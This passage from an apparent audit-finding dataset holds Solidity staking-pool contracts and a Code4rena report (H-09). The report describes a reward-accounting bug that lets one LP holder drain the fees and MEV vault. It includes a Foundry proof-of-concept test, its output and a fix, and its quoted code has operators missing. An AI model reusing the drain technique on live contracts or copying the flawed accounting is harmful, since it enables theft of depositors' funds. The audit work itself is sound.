the syndicate that was accrued by a list of actively staked validators\n    /// @param _blsPubKeys List of BLS public key identifiers of validators that have sETH staked in the syndicate for the vault\n    function claimFundsFromSyndicateForDistribution(bytes[] memory _blsPubKeys) external {\n        _claimFundsFromSyndicateForDistribution(liquidStakingNetworkManager.syndicate(), _blsPubKeys);\n    }\n\n    /// @dev Claim ETH from syndicate for a list of BLS public keys for later distribution amongst LPs\n    function _claimFundsFromSyndicateForDistribution(address _syndicate, bytes[] memory _blsPubKeys) internal {\n        require(_syndicate != address(0), \"Invalid configuration\");\n\n        // Claim all of the ETH due from the syndicate for the auto-staked sETH\n        Syndicate syndicateContract = Syndicate(payable(_syndicate));\n        syndicateContract.claimAsStaker(address(this), _blsPubKeys);\n\n        updateAccumulatedETHPerLP();\n    }\n\n    /// @dev Initialization logic\n    function _init(LiquidStakingManager _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) internal virtual {\n        require(address(_liquidStakingNetworkManager) != address(0), \"Zero Address\");\n        require(address(_lpTokenFactory) != address(0), \"Zero Address\");\n\n        liquidStakingNetworkManager = _liquidStakingNetworkManager;\n        lpTokenFactory = _lpTokenFactory;\n\n        baseLPTokenName = \"ETHLPToken_\";\n        baseLPTokenSymbol = \"ETHLP_\";\n        maxStakingAmountPerValidator = 4 ether;\n    }\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            // As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}\n\n",
        "CodeNames": [
            "IBrandNFT.sol",
            "SyndicateRewardsProcessor.sol",
            "StakingFundsVault.sol",
            "GiantMevAndFeesPool.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-09",
                "Location": [
                    "//solidity\nfunction _distributeETHRewardsToUserForToken(\n        address _user,\n        address _token,\n        uint256 _balance,\n        address _recipient\n    ) internal {\n        require(_recipient != address(0), \"Zero address\");\n        uint256 balance = _balance;\n        if (balance  0) {\n            // Calculate how much ETH rewards the address is owed / due \n            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) claimed[_user][_token];\n            if (due  0) {\n                claimed[_user][_token] = due;\n                totalClaimed += due;\n                (bool success, ) = _recipient.call{value: due}(\"\");\n\t\t\t\t...\n\t\t\t}\n        }\n    }\n",
                    "diff\ndiff --git a/test/foundry/StakingFundsVault.t.sol b/test/foundry/StakingFundsVault.t.sol\nindex 53b4ce0..4db8fc8 100644\n--a/test/foundry/StakingFundsVault.t.sol\n+++ b/test/foundry/StakingFundsVault.t.sol\n@@ -4,6 +4,7 @@ import \"forge-std/console.sol\";\n \n import { StakingFundsVault } from \"../../contracts/liquid-staking/StakingFundsVault.sol\";\n import { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\";\n+import { SyndicateRewardsProcessor} from \"../../contracts/liquid-staking/SyndicateRewardsProcessor.sol\";\n import {\n     TestUtils,\n     MockLSDNFactory,\n@@ -417,4 +418,73 @@ contract StakingFundsVaultTest is TestUtils {\n         assertEq(vault.totalClaimed(), rewardsAmount);\n         assertEq(vault.totalRewardsReceived(), rewardsAmount);\n     }\n+\n+    function testRepetitiveClaim() public {\n+        // register BLS key with the network\n+        registerSingleBLSPubKey(accountTwo, blsPubKeyFour, accountFive);\n+\n+        vm.label(accountOne, \"accountOne\");\n+        vm.label(accountTwo, \"accountTwo\");\n+        // Do a deposit of 4 ETH for bls pub key four in the fees and mev pool\n+        depositETH(accountTwo, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));\n+        depositETH(accountOne, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));\n+\n+        // Do a deposit of 24 ETH for savETH pool\n+        liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyFour, 24 ether);\n+\n+        stakeAndMintDerivativesSingleKey(blsPubKeyFour);\n+\n+        LPToken lpTokenBLSPubKeyFour = vault.lpTokenForKnot(blsPubKeyFour);\n+\n+        vm.warp(block.timestamp + 3 hours);\n+\n+        // Deal ETH to the staking funds vault\n+        uint256 rewardsAmount = 1.2 ether;\n+        console.log(\"depositing %s wei into the vault.n\", rewardsAmount);\n+        vm.deal(address(vault), rewardsAmount);\n+        assertEq(address(vault).balance, rewardsAmount);\n+        assertEq(vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);\n+        assertEq(vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);\n+\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne.n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        console.log(\"depositing %s wei into the vault.n\", rewardsAmount);\n+        vm.deal(address(vault), address(vault).balance + rewardsAmount);\n+        vm.warp(block.timestamp + 3 hours);\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne.n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne AGAIN.n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne AGAIN.n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        //console.log(\"Claiming rewards for accountTwo.n\");\n+        vm.prank(accountTwo);\n+        vault.claimRewards(accountTwo, getBytesArrayFromBytes(blsPubKeyFour));\n+\n+    }\n+\n+    function logAccounts() internal {\n+        console.log(\"accountOne previewAccumulatedETH : %i\", vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)));\n+        console.log(\"accountOne claimed               : %i\", SyndicateRewardsProcessor(vault).claimed(accountOne, address(vault.lpTokenForKnot(blsPubKeyFour))));\n+        console.log(\"accountTwo previewAccumulatedETH : %i\", vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)));\n+        console.log(\"accountTwo claimed               : %i\", SyndicateRewardsProcessor(vault).claimed(accountTwo, address(vault.lpTokenForKnot(blsPubKeyFour))));\n+        console.log(\"ETH Balances: accountOne: %i, accountTwo: %i, vault: %in\", accountOne.balance, accountTwo.balance, address(vault).balance);\n+    }\n+\n }\n\n",
                    "\nforge test -vv --match testRepetitiveClaim\n[\u2811] Compiling...\nNo files changed, compilation skipped\n\nRunning 1 test for test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest\n[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)\nLogs:\n  depositing 1200000000000000000 wei into the vault.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 0\n  accountTwo previewAccumulatedETH : 600000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 0, accountTwo: 0, vault: 1200000000000000000\n\n  Claiming rewards for accountOne.\n\n  accountOne previewAccumulatedETH : 0\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 600000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 600000000000000000\n\n  depositing 1200000000000000000 wei into the vault.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 1800000000000000000\n\n  Claiming rewards for accountOne.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 1200000000000000000, accountTwo: 0, vault: 1200000000000000000\n\n  Claiming rewards for accountOne AGAIN.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 1800000000000000000, accountTwo: 0, vault: 600000000000000000\n\n  Claiming rewards for accountOne AGAIN.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 2400000000000000000, accountTwo: 0, vault: 0\n\n\nTest result: FAILED. 0 passed; 1 failed; finished in 15.64ms\n\nFailing tests:\nEncountered 1 failing test in test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest\n[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n\n"
                ],
                "Type": " Incorrect accounting in  SyndicateRewardsProcessor  results in any LP token holder being able to steal other LP tokens holder's ETH from the fees and MEV vault",
                "Description": "*Submitted by c7e7eff(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/147), also found by Trust(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/425), 0x4non(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/348), arcoun(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/300), Jeiwan(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/256), unforgiven(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/237), cccz(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/219), corerouter(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/213), rotcivegaf(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/208), koxuan(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/131), aphak5010(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/130), 9svR6w(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/100), HE1M(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/59), and clems4ever(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/39)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L63<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88<br\n\nThe SyndicateRewardsProcessor's internal _distributeETHRewardsToUserForToken() function is called from external claimRewards() function in the StakingFundsVault contract. This function is called by LP Token holders to claim their accumulated rewards based on their LP Token holdings and already claimed rewards.<br\nThe accumulated rewards due are calculated as ((accumulatedETHPerLPShare * balance) / PRECISION) reduced by the previous claimed amount stored in claimed[_user][_token]. When the ETH is sent to the _user the stored value should be increased by the due amount. However in the current code base the claimed[_user][_token] is set equal to the calculated due.\n\nsolidity\nfunction _distributeETHRewardsToUserForToken(\n        address _user,\n        address _token,\n        uint256 _balance,\n        address _recipient\n    ) internal {\n        require(_recipient != address(0), \"Zero address\");\n        uint256 balance = _balance;\n        if (balance  0) {\n            // Calculate how much ETH rewards the address is owed / due \n            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) claimed[_user][_token];\n            if (due  0) {\n                claimed[_user][_token] = due;\n                totalClaimed += due;\n                (bool success, ) = _recipient.call{value: due}(\"\");\n\t\t\t\t...\n\t\t\t}\n        }\n    }\n\n\nThis means the first time a user will claim their rewards they will get the correct amount and the correct value will be stored in the claimed[_user][_token].  When extra ETH is recieved from the MEV and fees rewards and the user claims their reward again, the claimed amount will only reflect the last claimed amount. As a result they can then repeatedly claim untill the MEV and Fee vault is almost depleted.\n\n\nFollowing modification to the existing StakingFundsVault.t.sol will provide a test to demonstrate the issue:\n\ndiff\ndiff --git a/test/foundry/StakingFundsVault.t.sol b/test/foundry/StakingFundsVault.t.sol\nindex 53b4ce0..4db8fc8 100644\n--a/test/foundry/StakingFundsVault.t.sol\n+++ b/test/foundry/StakingFundsVault.t.sol\n@@ -4,6 +4,7 @@ import \"forge-std/console.sol\";\n \n import { StakingFundsVault } from \"../../contracts/liquid-staking/StakingFundsVault.sol\";\n import { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\";\n+import { SyndicateRewardsProcessor} from \"../../contracts/liquid-staking/SyndicateRewardsProcessor.sol\";\n import {\n     TestUtils,\n     MockLSDNFactory,\n@@ -417,4 +418,73 @@ contract StakingFundsVaultTest is TestUtils {\n         assertEq(vault.totalClaimed(), rewardsAmount);\n         assertEq(vault.totalRewardsReceived(), rewardsAmount);\n     }\n+\n+    function testRepetitiveClaim() public {\n+        // register BLS key with the network\n+        registerSingleBLSPubKey(accountTwo, blsPubKeyFour, accountFive);\n+\n+        vm.label(accountOne, \"accountOne\");\n+        vm.label(accountTwo, \"accountTwo\");\n+        // Do a deposit of 4 ETH for bls pub key four in the fees and mev pool\n+        depositETH(accountTwo, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));\n+        depositETH(accountOne, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));\n+\n+        // Do a deposit of 24 ETH for savETH pool\n+        liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyFour, 24 ether);\n+\n+        stakeAndMintDerivativesSingleKey(blsPubKeyFour);\n+\n+        LPToken lpTokenBLSPubKeyFour = vault.lpTokenForKnot(blsPubKeyFour);\n+\n+        vm.warp(block.timestamp + 3 hours);\n+\n+        // Deal ETH to the staking funds vault\n+        uint256 rewardsAmount = 1.2 ether;\n+        console.log(\"depositing %s wei into the vault.n\", rewardsAmount);\n+        vm.deal(address(vault), rewardsAmount);\n+        assertEq(address(vault).balance, rewardsAmount);\n+        assertEq(vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);\n+        assertEq(vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);\n+\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne.n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        console.log(\"depositing %s wei into the vault.n\", rewardsAmount);\n+        vm.deal(address(vault), address(vault).balance + rewardsAmount);\n+        vm.warp(block.timestamp + 3 hours);\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne.n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne AGAIN.n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne AGAIN.n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        //console.log(\"Claiming rewards for accountTwo.n\");\n+        vm.prank(accountTwo);\n+        vault.claimRewards(accountTwo, getBytesArrayFromBytes(blsPubKeyFour));\n+\n+    }\n+\n+    function logAccounts() internal {\n+        console.log(\"accountOne previewAccumulatedETH : %i\", vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)));\n+        console.log(\"accountOne claimed               : %i\", SyndicateRewardsProcessor(vault).claimed(accountOne, address(vault.lpTokenForKnot(blsPubKeyFour))));\n+        console.log(\"accountTwo previewAccumulatedETH : %i\", vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)));\n+        console.log(\"accountTwo claimed               : %i\", SyndicateRewardsProcessor(vault).claimed(accountTwo, address(vault.lpTokenForKnot(blsPubKeyFour))));\n+        console.log(\"ETH Balances: accountOne: %i, accountTwo: %i, vault: %in\", accountOne.balance, accountTwo.balance, address(vault).balance);\n+    }\n+\n }\n\n\n\nNote that the AccountOne repeatedly claims until the vault is empty and the claim for accountTwo fails.\n\nFollowing is an output of the test script showing the balances and differnet state variables:\n\n\nforge test -vv --match testRepetitiveClaim\n\u2811] Compiling...\nNo files changed, compilation skipped\n\nRunning 1 test for test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest\nFAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)\nLogs:\n  depositing 1200000000000000000 wei into the vault.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 0\n  accountTwo previewAccumulatedETH : 600000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 0, accountTwo: 0, vault: 1200000000000000000\n\n  Claiming rewards for accountOne.\n\n  accountOne previewAccumulatedETH : 0\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 600000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 600000000000000000\n\n  depositing 1200000000000000000 wei into the vault.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 1800000000000000000\n\n  Claiming rewards for accountOne.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 1200000000000000000, accountTwo: 0, vault: 1200000000000000000\n\n  Claiming rewards for accountOne AGAIN.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 1800000000000000000, accountTwo: 0, vault: 600000000000000000\n\n  Claiming rewards for accountOne AGAIN.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 2400000000000000000, accountTwo: 0, vault: 0\n\n\nTest result: FAILED. 0 passed; 1 failed; finished in 15.64ms\n\nFailing tests:\nEncountered 1 failing test in test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest\nFAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n\n\n\n\nManual review / forge test\n\n",
                "Repair": "\nThe SyndicateRewardsProcessor contract should be modified as follows:\n\ndiff\ndiff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol\nindex 81be706..9b9c502 100644\n--a/contracts/liquid-staking/SyndicateRewardsProcessor.sol\n+++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol\n@@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {\n             // Calculate how much ETH rewards the address is owed / due \n             uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) claimed[_user][_token];\n             if (due  0) {\n               claimed[_user][_token] = due;\n+                claimed[_user][_token] += due;\n \n                 totalClaimed += due;\n \n\n\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/147)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\n/// @notice Allows a contract to receive rewards from a syndicate and distribute it amongst LP holders\nabstract contract SyndicateRewardsProcessor {\n\n    /// @notice Emitted when ETH is received by the contract and processed\n    event ETHReceived(uint256 amount);\n\n    /// @notice Emitted when ETH from syndicate is distributed to a user\n    event ETHDistributed(address indexed user, address indexed recipient, uint256 amount);\n\n    /// @notice Precision used in rewards calculations for scaling up and down\n    uint256 public constant PRECISION = 1e24;\n\n    /// @notice Total accumulated ETH per share of LP<>KNOT that has minted derivatives scaled to 'PRECISION'\n    uint256 public accumulatedETHPerLPShare;\n\n    /// @notice Total ETH claimed by all users of the contract\n    uint256 public totalClaimed;\n\n    /// @notice Last total rewards seen by the contract\n    uint256 public totalETHSeen;\n\n    /// @notice Total ETH claimed by a given address for a given token\n    mapping(address => mapping(address => uint256)) public claimed;\n\n    /// @dev Internal logic for previewing accumulated ETH for an LP user\n    function _previewAccumulatedETH(\n        address _sender,\n        address _token,\n        uint256 _balanceOfSender,\n        uint256 _numOfShares,\n        uint256 _unclaimedETHFromSyndicate\n    ) internal view returns (uint256) {\n        if (_balanceOfSender > 0) {\n            uint256 claim = claimed[_sender][_token];\n\n            uint256 received = totalRewardsReceived() + _unclaimedETHFromSyndicate;\n            uint256 unprocessed = received - totalETHSeen;\n\n            uint256 newAccumulatedETH = accumulatedETHPerLPShare + ((unprocessed * PRECISION) / _numOfShares);\n\n            return ((newAccumulatedETH * _balanceOfSender) / PRECISION) - claim;\n        }\n        return 0;\n    }\n\n    /// @dev Any due rewards from node running can be distributed to msg.sender if they have an LP balance\n    function _distributeETHRewardsToUserForToken(\n        address _user,\n        address _token,\n        uint256 _balance,\n        address _recipient\n    ) internal {\n        require(_recipient != address(0), \"Zero address\");\n        uint256 balance = _balance;\n        if (balance > 0) {\n            // Calculate how much ETH rewards the address is owed / due \n            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];\n            if (due > 0) {\n                claimed[_user][_token] = due;\n\n                totalClaimed += due;\n\n                (bool success, ) = _recipient.call{value: 